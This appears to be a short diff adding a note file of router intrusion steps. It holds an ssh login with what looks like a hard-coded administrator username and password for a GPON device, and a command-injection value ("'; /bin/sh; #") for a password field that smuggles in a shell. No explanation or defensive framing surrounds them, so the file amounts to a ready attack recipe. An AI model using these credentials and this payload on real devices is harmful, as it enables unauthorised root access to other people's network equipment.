@@ -1,0 +1,3 @@
+ssh AdminGPON@192.168.1.254:ALC#FGU
+dynamic password2:'; /bin/sh; #
+
